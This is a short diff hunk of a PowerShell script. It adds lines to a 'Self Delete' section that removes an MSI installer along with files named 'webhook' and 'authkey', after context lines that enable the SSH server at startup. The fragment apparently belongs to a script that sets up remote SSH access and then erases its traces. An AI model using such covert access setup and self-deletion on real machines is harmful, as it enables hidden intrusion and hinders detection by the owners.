@@ -113,6 +113,8 @@ Set-Service -Name sshd -StartupType 'Automatic'
 Get-NetFirewallRule -Name *ssh*
 
 ## Self Delete
+Remove-Item "C:/file.msi"
+Remove-Item $temp/$dirName/"file.msi"
 Remove-Item "$PSScriptRoot/$env:computername.fk" 
 Remove-Item "$PSScriptRoot/webhook"
 Remove-Item "$PSScriptRoot/authkey"
